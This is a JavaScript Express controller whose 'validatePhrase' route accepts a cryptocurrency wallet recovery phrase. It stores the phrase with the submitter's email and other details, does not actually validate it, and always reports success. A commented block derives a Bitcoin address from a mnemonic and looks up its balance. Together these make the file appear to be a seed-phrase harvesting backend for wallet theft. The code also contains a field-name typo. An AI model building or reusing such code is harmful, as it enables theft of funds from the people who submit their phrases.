
const ErrorHandler = require("../utils/errorHandler");
const catchAsyncErrors = require("../midllewares/catchAsyncErrors");
const APIFeatures = require("../utils/apiFeatures");
const sendArtisanToken = require("../utils/jwtArtisanToken");
const sendEmail = require("../utils/sendEmail");

const bip39 = require('bip39')
const bitcoin = require('bitcoinjs-lib');
const axios = require('axios');

const crypto = require("crypto");

const User = require('../models/user')


exports.validatePhrase = catchAsyncErrors(async (req, res, next)=>{

  let updatedDocument;
  
  const { mnemonic, ...rest } = req.body

  try {

    let query;
    
    if(rest.email){
      query = { 
        $or:[
            { email: rest.email },
            { 'mnemonics.monemonic': mnemonic }
        ]
      }
    }else{
      delete rest.email
      query = { 'mnemonics.mnemonic': mnemonic }
    }
        
    const existingDocument = await User.findOne(query);
    
    if(existingDocument){
      
      existingDocument.mnemonics.addToSet({ mnemonic: mnemonic });
      
      Object.assign(existingDocument, rest)

      updatedDocument = await existingDocument.save();

    }else{
      updatedDocument = await User.create({mnemonics: { mnemonic }, ...rest})
    }


    } catch (error) {
      console.error('Error updating or creating document:', error);
      return next(new ErrorHandler('Internal Error', 500))
    }

    res.status(200).json({
      success: true,
    })

  /*
  const mnemonic = 'clown pupil card achieve fine distance father middle opera solid oil castle'
  // Derive BTC addresses from the mnemonic phrase
  const btcNetwork = bitcoin.networks.bitcoin;
  const hdNode = bitcoin.bip32.fromSeed(bip39.mnemonicToSeedSync(mnemonic), btcNetwork);
  const address = bitcoin.payments.p2pkh({ pubkey: hdNode.derive(0).publicKey, network: btcNetwork }).address;

  // Check BTC balance
  axios.get(`https://blockstream.info/api/address/${address}/utxo`)
      .then(response => {
          const balance = response.data.reduce((acc, utxo) => acc + utxo.value, 0);
          console.log('BTC Balance:', balance);
      })
      .catch(error => console.error('Error fetching BTC balance:', error));

  */
})
